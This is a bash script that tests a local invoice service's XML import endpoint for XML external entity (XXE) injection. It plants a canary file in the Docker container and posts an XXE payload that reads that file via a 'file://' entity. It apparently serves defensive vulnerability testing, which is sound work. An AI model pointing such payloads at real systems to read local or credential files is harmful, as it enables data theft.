#!/bin/bash

# Create logs directory if it doesn't exist
mkdir -p logs

# Get timestamp for log files
timestamp=$(date +%Y%m%d_%H%M%S)
log_file="logs/xml_test_${timestamp}.log"

echo "Starting XML endpoint test at $(date)" | tee -a "$log_file"

# Create test XML files
echo "Creating test XML files..." | tee -a "$log_file"

# Basic XML test
cat > /tmp/basic.xml << EOL
<?xml version="1.0" encoding="UTF-8"?>
<invoice>
  <customer>Test Customer</customer>
  <items>
    <item>Test Item</item>
  </items>
</invoice>
EOL

# Create test file with special content in container
echo "Creating test file in container..." | tee -a "$log_file"
docker exec invoicer-invoicer-1 /bin/sh -c 'echo "SECRET_TEST_CONTENT_123" > /tmp/xxe_test.txt && chmod 644 /tmp/xxe_test.txt'

# XXE test file with simpler payload
cat > /tmp/xxe.xml << EOL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///tmp/xxe_test.txt">
]>
<invoice>
  <customer>Test Customer</customer>
  <items>
    <item>&xxe;</item>
  </items>
</invoice>
EOL

echo -e "\nTest files created:" | tee -a "$log_file"
echo "Basic XML:" | tee -a "$log_file"
cat /tmp/basic.xml | tee -a "$log_file"
echo -e "\nXXE test file content (in container):" | tee -a "$log_file"
docker exec invoicer-invoicer-1 cat /tmp/xxe_test.txt | tee -a "$log_file"
echo -e "\nXXE XML:" | tee -a "$log_file"
cat /tmp/xxe.xml | tee -a "$log_file"

# Test basic XML
echo -e "\nTesting basic XML..." | tee -a "$log_file"
curl -v -X POST \
  -H "Content-Type: application/xml" \
  --data-binary @/tmp/basic.xml \
  http://localhost:3000/api/invoice/import/xml > /tmp/basic_response.json 2>> "$log_file"

echo -e "\nBasic XML Response:" | tee -a "$log_file"
cat /tmp/basic_response.json | tee -a "$log_file"

# Test XXE
echo -e "\nTesting XXE..." | tee -a "$log_file"
curl -v -X POST \
  -H "Content-Type: application/xml" \
  --data-binary @/tmp/xxe.xml \
  http://localhost:3000/api/invoice/import/xml > /tmp/xxe_response.json 2>> "$log_file"

echo -e "\nXXE Response:" | tee -a "$log_file"
cat /tmp/xxe_response.json | tee -a "$log_file"

# Check container logs
echo -e "\nContainer logs:" | tee -a "$log_file"
docker logs invoicer-invoicer-1 --tail 50 2>&1 | tee -a "$log_file"

# Cleanup
rm -f /tmp/basic.xml /tmp/xxe.xml /tmp/basic_response.json /tmp/xxe_response.json
docker exec invoicer-invoicer-1 rm -f /tmp/xxe_test.txt

echo -e "\nTest completed at $(date)" | tee -a "$log_file"
echo "Log file: $log_file" 